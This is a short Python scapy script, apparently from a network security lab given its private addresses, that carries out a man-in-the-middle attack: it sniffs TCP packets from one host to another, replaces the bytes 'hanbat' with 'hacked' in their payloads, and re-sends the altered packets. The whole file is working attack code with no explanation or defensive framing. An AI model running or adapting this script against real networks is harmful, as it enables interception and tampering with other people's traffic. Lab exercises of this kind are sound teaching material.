#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

MAC_A = "02:42:0a:09:00:05"
IP_A = "10.9.0.5"
IP_B = "192.168.60.5"
my_iface = 'eth0'
my_filter = 'tcp and ether src {A} and ip dst {B}'.format(A=MAC_A, B=IP_B)

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'hanbat', b'hacked')

       send(newpkt/newdata)
   else: 
       send(newpkt)

pkt = sniff(iface=my_iface, filter=my_filter, prn=spoof_pkt)

